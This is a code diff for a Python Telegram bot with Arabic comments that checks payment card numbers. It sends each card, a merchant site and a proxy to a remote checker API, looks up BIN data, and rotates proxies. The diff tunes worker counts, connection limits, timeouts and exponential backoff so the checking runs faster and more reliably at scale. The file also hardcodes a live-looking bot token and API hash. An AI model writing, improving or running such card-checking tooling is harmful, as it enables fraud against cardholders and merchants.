@@ -11,7 +11,7 @@ import re
 import html
 import urllib.parse
 from datetime import datetime
-import io  # لإرسال الـ GIF بنجاح
+import io  
 
 # --- الإعدادات الأساسية ---
 CHECKER_API_URL = 'http://62.72.20.10:8081/'
@@ -19,14 +19,15 @@ API_ID = 30067059
 API_HASH = 'c9ee8df29903caf150937299f97703e2'
 BOT_TOKEN = '8145446640:AAEiIDCzyoDlaf2NICb_TRz-x1SG8jffMc8'
 
-WORKERS = 70
-DELAY = 0.02  # تم تقليل التأخير لزيادة السرعة
+# تم تقليل التأخير وعدد العمال لتجنب خنق الخادم والبروكسيات
+WORKERS = 30
+DELAY = 0.02  
 
 PREMIUM_FILE = 'premium.txt'
 SITES_FILE = 'sites.txt'
 PROXY_FILE = 'proxy.txt'
 
-# --- 1. متغيرات الإيموجيات المخصصة (تم إعادتها للسورس الأصلي) ---
+# --- 1. متغيرات الإيموجيات المخصصة ---
 E_SPARKLE = '<tg-emoji emoji-id="5325547803936572038">✨</tg-emoji>'
 E_SEARCH  = '<tg-emoji emoji-id="5231012545799666522">🔍</tg-emoji>'
 E_SHIELD  = '<tg-emoji emoji-id="5251203410396458957">🛡</tg-emoji>'
@@ -108,14 +109,14 @@ _DEAD_INDICATORS = (
 )
 
 # =========================================================================
-# الحل السحري للسرعة: الجلسة الموحدة (Global Session)
+# الجلسة الموحدة (Global Session) مع تحديد الاتصالات لتجنب التعليق
 # =========================================================================
 _global_session = None
 
 async def get_session():
     global _global_session
     if _global_session is None or _global_session.closed:
-        connector = aiohttp.TCPConnector(limit=0, ssl=False)
+        connector = aiohttp.TCPConnector(limit=100, ssl=False)
         _global_session = aiohttp.ClientSession(connector=connector)
     return _global_session
 # =========================================================================
@@ -150,7 +151,7 @@ async def get_bin_info(card_number):
     try:
         bin_number = card_number[:6]
         timeout = aiohttp.ClientTimeout(total=10)
-        session = await get_session() # استخدام الجلسة السريعة
+        session = await get_session()
         async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=timeout) as res:
             if res.status != 200:
                 return 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', ''
@@ -178,10 +179,12 @@ async def check_card(card, site, proxy):
             return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card, 'proxy': proxy}
 
         params = {'cc': card, 'url': site, 'proxy': proxy}
-        timeout = aiohttp.ClientTimeout(total=30)
+        timeout = aiohttp.ClientTimeout(total=20, connect=5)
         
-        session = await get_session() # استخدام الجلسة السريعة بدل فتح وإغلاق اتصال جديد
+        session = await get_session() 
         async with session.get(CHECKER_API_URL, params=params, timeout=timeout) as resp:
+            if resp.status in [502, 503, 504]:
+                 return {'status': 'Site Error', 'message': f'API Congested ({resp.status})', 'card': card, 'retry': True, 'proxy': proxy}
             raw = await resp.json(content_type=None)
 
         response_msg = raw.get('Response', '')
@@ -214,10 +217,10 @@ async def check_card(card, site, proxy):
 
     except asyncio.TimeoutError:
         return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True, 'proxy': proxy}
-    except aiohttp.ClientError as e:
-        return {'status': 'Site Error', 'message': f'API Connection Dropped', 'card': card, 'retry': True, 'proxy': proxy}
-    except Exception as e:
-        return {'status': 'Site Error', 'message': f'API Error', 'card': card, 'retry': True, 'proxy': proxy}
+    except aiohttp.ClientError:
+        return {'status': 'Site Error', 'message': 'API Connection Dropped', 'card': card, 'retry': True, 'proxy': proxy}
+    except Exception:
+        return {'status': 'Site Error', 'message': 'API Error', 'card': card, 'retry': True, 'proxy': proxy}
 
 async def check_card_with_retry(card, sites, proxies, max_retries=15):
     last_result = None
@@ -242,7 +245,8 @@ async def check_card_with_retry(card, sites, proxies, max_retries=15):
 
         if attempt < max_retries - 1:
             if any(x in msg_lower for x in ['502', '503', '504', 'congested', 'limit', 'too many', 'api connection dropped', 'api timeout', 'api error']):
-                await asyncio.sleep(random.uniform(1.5, 3.5))
+                backoff_time = min((1.5 ** attempt) + random.uniform(0.5, 1.5), 10.0)
+                await asyncio.sleep(backoff_time)
             else:
                 await asyncio.sleep(DELAY) 
 
@@ -289,13 +293,10 @@ Proxy  ›  <code>{proxy}</code> {E_PROXY}"""
 
     random_gif_url = random.choice(ANIME_GIFS)
 
-    # ----------------------------------------------------
-    # تحميل الـ GIF لتفادي رفض تيليجرام للرابط الخارجي (تم تسريعه)
-    # ----------------------------------------------------
     gif_file_obj = None
     try:
         timeout = aiohttp.ClientTimeout(total=10)
-        session = await get_session() # استخدام الجلسة السريعة
+        session = await get_session() 
         async with session.get(random_gif_url, timeout=timeout) as resp:
             if resp.status == 200:
                 gif_bytes = await resp.read()
@@ -399,7 +400,7 @@ async def test_site(site, proxy):
     try:
         params = {'cc': "5154623245618097|03|2032|156", 'url': site, 'proxy': proxy}
         timeout = aiohttp.ClientTimeout(total=30)
-        session = await get_session() # استخدام الجلسة السريعة
+        session = await get_session()
         async with session.get(CHECKER_API_URL, params=params, timeout=timeout) as resp:
             raw = await resp.json(content_type=None)
         response_msg = raw.get('Response', '').lower()
@@ -416,7 +417,7 @@ async def test_proxy(proxy):
         else: proxy_url = f"http://{proxy_url}"
     try:
         timeout = aiohttp.ClientTimeout(total=15)
-        session = await get_session() # استخدام الجلسة السريعة
+        session = await get_session() 
         async with session.get('http://httpbin.org/ip', proxy=proxy_url, timeout=timeout) as resp:
             if resp.status == 200: return {'proxy': proxy, 'status': 'alive'}
             else: return {'proxy': proxy, 'status': 'dead'}
